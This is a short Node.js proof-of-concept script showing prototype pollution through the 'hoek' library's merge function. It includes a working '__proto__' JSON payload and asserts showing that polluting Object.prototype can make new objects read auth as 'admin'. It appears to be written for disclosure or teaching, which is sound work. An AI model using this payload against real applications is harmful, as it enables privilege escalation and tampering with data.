var assert = require('assert');
var hoek = require('hoek');

normal();
poc();
why();


function normal() { 
	var overwrite = { foo: 'bar' };
	var anObject = {};
	hoek.merge(anObject, overwrite);

	assert(anObject.foo === 'bar')
}

function poc() {
	var injectJSON = '{ "__proto__": { "injected": "I am coming~~" } }';
	var inject = JSON.parse(injectJSON);
	var anObject = {};

	console.log('before:', anObject.injected);
	hoek.merge({}, inject);
	console.log('after:', anObject.injected);
}


function why() { 
	var a = {};
	var b = { auth: 'guest' };
	var c = { foo: 'bar' };

	assert(a.__proto__ === b.__proto__);
	assert(a.__proto__ === Object.prototype);

	// create a __proto__ field
	a.__proto__.auth = 'admin';

	assert(a.auth === 'admin');
	assert(b.auth === 'guest');

	delete b.auth;
	assert(b.auth === 'admin');

	var newObject = {};
	assert(newObject.auth === 'admin');

	delete Object.prototype.auth;
	assert(typeof b.auth === 'undefined');
}